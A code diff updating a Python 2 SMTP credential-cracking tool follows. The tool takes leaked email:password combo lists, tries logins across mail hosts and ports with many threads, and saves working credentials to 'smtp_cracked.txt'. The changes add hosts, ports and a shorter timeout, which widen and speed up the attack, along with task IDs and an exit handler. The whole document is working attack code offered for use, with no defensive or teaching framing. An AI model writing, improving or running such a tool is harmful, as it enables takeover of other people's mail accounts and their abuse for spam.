@@ -1,4 +1,4 @@
-import socket,threading,base64,datetime,sys,ssl,imaplib,time,re,os,sys,random
+import socket,threading,base64,datetime,sys,ssl,imaplib,time,re,os,sys,random,signal
 try:
 	import Queue
 except:
@@ -190,10 +190,10 @@ class consumer(threading.Thread):
 	def __init__(self,qu):
 		threading.Thread.__init__(self)
 		self.q=qu
-		self.hosts=["","smtp.","mail.","webmail."]
-		self.ports=[587,465,25]
+		self.hosts=["","smtp.","mail.","webmail.","mx."]
+		self.ports=[587,465,25,2525]
 
-		self.timeout=5
+		self.timeout=2
 
 	def sendCmd(self,sock,cmd):
 		sock.send(cmd+"\r\n")
@@ -286,6 +286,7 @@ class consumer(threading.Thread):
 		host=tupple[0].rstrip()
 		host1=host
 		user=tupple[1].rstrip()
+		task_id = tupple[3]
 		
 		if host1 in cracked or host1 in bads:
 			return 0
@@ -302,7 +303,7 @@ class consumer(threading.Thread):
 			return -1
 		port=str(self.ports[cache[host][1]])
 		host=self.hosts[cache[host][0]]+host
-		print '\033[93m[>] Trying \033[00m'+host+':'+port
+		print '\033[93m['+str(task_id)+'] Trying \033[00m'+host+':'+port
 		try:
 			banner=s.recv(1024)
 			if banner[0:3]!="220":
@@ -325,7 +326,7 @@ class consumer(threading.Thread):
 				self.sendCmd(s,'QUIT')
 				s.close()
 				return 0
-			print '\033[93m[>] Sending \033[00m'+host+'|'+port+'|'+user+'|'+passw
+			print '\033[92m[>] Sending \033[00m'+host+'|'+port+'|'+user+'|'+passw
 			open('smtp_cracked.txt','a').write(host+"|"+port+"|"+user+"|"+passw+"\n") #Some Peaple Need This Format
 			cracked.append(host1)
 			rez=self.sendCmd(s,"RSET")
@@ -371,6 +372,12 @@ class consumer(threading.Thread):
 			self.connect(cmb)
 			self.q.task_done()
 
+def quit(signum, frame):
+	print "\033[93mExiting...\033[00m\n"
+	sys.exit(0)
+
+signal.signal(signal.SIGINT, quit)
+
 quee=Queue.Queue(maxsize=0)
 tld=['']
 tlds=cache={}
@@ -391,8 +398,8 @@ except:
  try:
  	email = raw_input(' \033[94m[\033[92mEmail address to verify: \033[94m]\033[00m ')
  except:
- 	email = 'omgmovebx@outlook.com'
- 	print 'using default email: omgmovebx@outlook.com'
+ 	email = 'foxtestbox@outlook.com'
+ 	print 'using default email: foxtestbox@outlook.com'
  try:
   thret=raw_input('\033[94m [\033[92mThreads (Max:200): \033[94m] \033[00m')
  except:
@@ -425,13 +432,15 @@ for i in range(int(thret)):
 		print "\033[91m{!} Working only with %s threads\033[00m"%i
 		break
 
+	j = 0
 	for i in inputs:
 		if re.match('[\w\.=-]+@[\w\.-]+\.[\w]{2,3}:[a-zA-Z]\w{3,14}',i):
 			user = i.split(':')[0]
 			password = i.split(':')[1]
 			user = user.lower()
-			quee.put((user.split('@')[1], user, password))
+			quee.put((user.split('@')[1], user, password, j))
 		if i.count('|')==3:
 			ii=i.split('|')
-			quee.put((ii[0], ii[2], ii[3]))
+			quee.put((ii[0], ii[2], ii[3], j))
+		j += 1
 quee.join()
